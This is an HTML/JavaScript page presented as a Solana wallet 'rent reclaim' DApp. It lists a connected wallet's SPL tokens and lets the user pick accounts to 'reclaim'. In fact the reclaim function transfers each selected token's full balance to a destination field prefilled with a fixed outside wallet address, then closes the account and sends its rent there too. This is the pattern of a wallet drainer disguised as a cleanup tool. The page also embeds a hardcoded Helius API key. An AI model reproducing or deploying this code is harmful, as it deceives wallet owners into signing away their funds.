<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Universal Solana Wallet DApp (Helius)</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;padding:40px;background:#f0f2f5}
#walletApp{max-width:700px;width:100%;padding:20px;background:#fff;border-radius:10px;box-shadow:0 6px 24px rgba(0,0,0,0.08)}
button{padding:12px;border-radius:8px;border:0;font-size:15px;cursor:pointer;margin:5;background:#4caf50;color:#fff}
button:hover{background:#45a049}
#logs{margin-top:12px;padding:12px;border-radius:8px;background:#e8f4fd;white-space:pre-wrap;max-height:420px;overflow:auto;text-align:left}
h2{margin:0 0 12px 0}
.note{font-size:13px;color:#666;margin-top:8px}
/* Custom dropdown */
.dropdown{position:relative;width:48%;cursor:pointer;border:1px solid #ccc;border-radius:8px;padding:10px;background:#fff;display:flex;align-items:center;justify-content:space-between}
.dropdown .selected{display:flex;align-items:center;gap:8px}
.dropdown .options{position:absolute;top:100%;left:0;width:100%;background:#fff;border:1px solid #ccc;border-radius:8px;max-height:200px;overflow:auto;display:none;flex-direction:column;z-index:100}
.dropdown .option{padding:8px 10px;display:flex;align-items:center;gap:8px;cursor:pointer}
.dropdown .option:hover{background:#f0f0f0}
.wallet-icon{width:20px;height:20px;}
table{width:100%;border-collapse:collapse;margin-top:12px}
table th,table td{border:1px solid #ccc;padding:6px;text-align:center}
</style>
</head>
<body>
<div id="walletApp">
<h2>Universal Solana Wallet DApp (Helius)</h2>

<div style="display:flex;gap:8px;align-items:center;justify-content:center;margin-bottom:8px">
  <div class="dropdown" id="walletDropdown">
    <div class="selected"><span>Select Wallet</span> â–¼</div>
    <div class="options"></div>
  </div>
</div>

<div style="text-align:center">
  <button id="connectWallet">Connect Wallet</button>
  <button id="disconnectWallet">Disconnect Wallet</button>
</div>

<div style="margin-top:12px">
  Destination wallet: <input type="text" id="destWallet" value="5rrJJykVDgeMYWiXRvMoMjGZiYyDj6791kiymaETXM4K" style="width:100%;padding:6px;border-radius:4px;border:1px solid #ccc">
</div>

<div style="margin-top:12px">
  <table id="tokenTable">
    <thead><tr><th>Select</th><th>Mint</th><th>Amount</th><th>USD</th></tr></thead>
    <tbody></tbody>
  </table>
</div>

<div style="text-align:center;margin-top:8px">
  <button id="reclaimRentBtn">ðŸ§¹ Reclaim Selected Accounts</button>
</div>

<div class="note">Using Helius RPC (demo key) â€” do not commit private keys to public repos.</div>
<div id="logs">Logs will appear here...</div>
</div>

<!-- Solana Web3 & SPL Token -->
<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.7/dist/index.iife.js"></script>

<script>
(async function(){
const HELIUS_RPC='https://mainnet.helius-rpc.com/?api-key=b933e448-6fee-4016-b4ec-3c6c19a46775';
const TOKEN_PROGRAM='TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA';
const DUST_THRESHOLD_USD=0.01;

const walletDropdown=document.getElementById('walletDropdown');
const selectedEl=walletDropdown.querySelector('.selected span');
const optionsEl=walletDropdown.querySelector('.options');
const connectBtn=document.getElementById('connectWallet');
const disconnectBtn=document.getElementById('disconnectWallet');
const reclaimBtn=document.getElementById('reclaimRentBtn');
const logsEl=document.getElementById('logs');
const tokenTableBody=document.querySelector('#tokenTable tbody');
const destInput=document.getElementById('destWallet');

let wallet=null;
let publicKey=null;
let connection=null;
let selectedWalletObj=null;

const WALLET_ICONS={
Phantom:'https://i.postimg.cc/dtMtxggx/download-2025-10-28T170610-630.png',
Solflare:'https://i.postimg.cc/YqcqsTTP/download-2025-10-28T170541-439.png',
Slope:'https://raw.githubusercontent.com/solana-labs/wallet-adapter/main/packages/wallets/wallet-icons/src/slope.svg'
};

function log(msg){ logsEl.innerText+=msg+'\n'; logsEl.scrollTop=logsEl.scrollHeight; console.log(msg);}
function clearLogs(){ logsEl.innerText=''; }

function detectWallets(){
  const wallets=[];
  if(window.phantom?.solana?.isPhantom) wallets.push({wallet: window.phantom.solana,name:'Phantom'});
  if(window.solflare?.isSolflare) wallets.push({wallet: window.solflare,name:'Solflare'});
  if(window.Slope){try{wallets.push({wallet:new window.Slope(),name:'Slope'});}catch{}}
  return wallets;
}

function populateDropdown(){
  optionsEl.innerHTML='';
  detectWallets().forEach(w=>{
    const div=document.createElement('div');
    div.className='option';
    div.innerHTML=`<img class="wallet-icon" src="${WALLET_ICONS[w.name]||''}"><span>${w.name}</span>`;
    div.onclick=()=>{ selectedWalletObj=w; selectedEl.innerHTML=`<img class="wallet-icon" src="${WALLET_ICONS[w.name]||''}"><span>${w.name}</span>`; optionsEl.style.display='none'; };
    optionsEl.appendChild(div);
  });
}
selectedEl.parentElement.onclick=()=>{ optionsEl.style.display=optionsEl.style.display==='flex'?'none':'flex'; }

function buildConnection(){ return new solanaWeb3.Connection(HELIUS_RPC,'confirmed'); }

async function getTokenPrices(mints){
  if(!mints.length) return {};
  try{
    const res=await fetch('https://api.helius.xyz/v0/token-prices?api-key=b933e448-6fee-4016-b4ec-3c6c19a46775',{
      method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mints})
    });
    const data=await res.json();
    if(!Array.isArray(data)) return {};
    const map={};
    data.forEach(p=>{ map[p.mint]=p.price||0; });
    return map;
  }catch(e){ log('âš ï¸ Token prices fetch failed: '+e.message); return {}; }
}

async function connectWalletFunc(){
  clearLogs();
  tokenTableBody.innerHTML='';
  if(!selectedWalletObj){ log('âŒ Select a wallet first'); return; }
  try{
    log('Connecting ' + selectedWalletObj.name + '...');
    const resp=await selectedWalletObj.wallet.connect();
    publicKey=resp?.publicKey||selectedWalletObj.wallet?.publicKey;
    if(publicKey?.toString) publicKey=publicKey.toString();
    wallet=selectedWalletObj.wallet;
    log('âœ… Connected: '+publicKey);
    if(!connection) connection=buildConnection();

    // SOL
    const lamports=await connection.getBalance(new solanaWeb3.PublicKey(publicKey));
    log('ðŸ’° SOL Balance: '+(lamports/1e9).toFixed(6)+' SOL');

    // SPL tokens
    const tokenAccounts=await connection.getParsedTokenAccountsByOwner(
      new solanaWeb3.PublicKey(publicKey),
      {programId:new solanaWeb3.PublicKey(TOKEN_PROGRAM)}
    );
    const mints=tokenAccounts.value.map(t=>t.account.data.parsed.info.mint);
    const prices=await getTokenPrices(mints);
    if(!tokenAccounts.value.length) log('No SPL tokens found.');
    else{
      tokenAccounts.value.forEach((t,i)=>{
        const info=t.account.data.parsed.info;
        const amount=Number(info.tokenAmount.uiAmount);
        const usd=(amount*(prices[info.mint]||0)).toFixed(6);
        const row=document.createElement('tr');
        row.innerHTML=`<td><input type="checkbox" data-index="${i}"></td><td>${info.mint}</td><td>${amount}</td><td>$${usd}</td>`;
        tokenTableBody.appendChild(row);
        t.amount=amount; t.usd=usd; // save for reclaim
      });
      tokenAccounts.savedAccounts=tokenAccounts.value; // save
      window.tokenAccounts=tokenAccounts; // global ref
    }

  }catch(e){ log('âŒ Connect failed: '+e.message); }
}

async function disconnectWalletFunc(){
  if(!wallet){ log('âŒ No wallet connected'); return; }
  try{ if(wallet.disconnect) await wallet.disconnect(); log('Wallet disconnected'); wallet=null; publicKey=null; selectedWalletObj=null; tokenTableBody.innerHTML=''; window.tokenAccounts=null;}
  catch(e){ log('âŒ Disconnect error: '+e.message);}
}

async function reclaimRent(){
  if(!wallet||!publicKey){ log('âŒ Connect wallet first.'); return; }
  if(!window.tokenAccounts) { log('âŒ No token accounts cached'); return; }
  clearLogs();
  log('ðŸ§¹ Reclaim Rent started...');

  const rows=[...tokenTableBody.querySelectorAll('input[type=checkbox]')];
  const selectedRows=rows.filter(r=>r.checked);
  if(!selectedRows.length){ log('âŒ No token accounts selected'); return; }

  const destPubKey=destInput.value.trim();
  if(!destPubKey){ log('âŒ Enter destination wallet'); return; }

  const splToken=window.splToken;
  if(!splToken){ log('âŒ splToken library not loaded'); return; }

  for(const row of selectedRows){
    const idx=row.dataset.index;
    const t=window.tokenAccounts.savedAccounts[idx];
    const tokenPub=new solanaWeb3.PublicKey(t.pubkey);
    const destKey=new solanaWeb3.PublicKey(destPubKey);
    try{
      // Transfer all tokens to destination
      const transferIx=splToken.createTransferInstruction(tokenPub,destKey,publicKey,t.amount,TOKEN_PROGRAM);
      const closeIx=splToken.createCloseAccountInstruction(tokenPub,destKey,publicKey,TOKEN_PROGRAM);
      const tx=new solanaWeb3.Transaction().add(transferIx,closeIx);
      tx.feePayer=new solanaWeb3.PublicKey(publicKey);
      const {blockhash}=await connection.getLatestBlockhash();
      tx.recentBlockhash=blockhash;
      let sig;
      if(wallet.signTransaction){
        const signedTx=await wallet.signTransaction(tx);
        sig=await connection.sendRawTransaction(signedTx.serialize());
      } else if(wallet.signAndSendTransaction){
        const res=await wallet.signAndSendTransaction(tx);
        sig=res?.signature||res;
      } else throw new Error('Wallet cannot sign transaction');
      await connection.confirmTransaction(sig,'confirmed');
      log(`âœ… Transfer/Close success for ${t.account.data.parsed.info.mint} â€” tx ${sig}`);
    }catch(e){ log(`âŒ Transfer/Close failed for ${t.account.data.parsed.info.mint}: ${e?.message||e}`);}
  }
  log('ðŸŽ‰ Reclaim run complete.');
}

// Events
connectBtn.addEventListener('click',connectWalletFunc);
disconnectBtn.addEventListener('click',disconnectWalletFunc);
reclaimBtn.addEventListener('click',reclaimRent);

connection=buildConnection();
populateDropdown();
setInterval(()=>{ if(detectWallets().length!==optionsEl.children.length) populateDropdown(); },3000);
})();
</script>
</body>
</html>

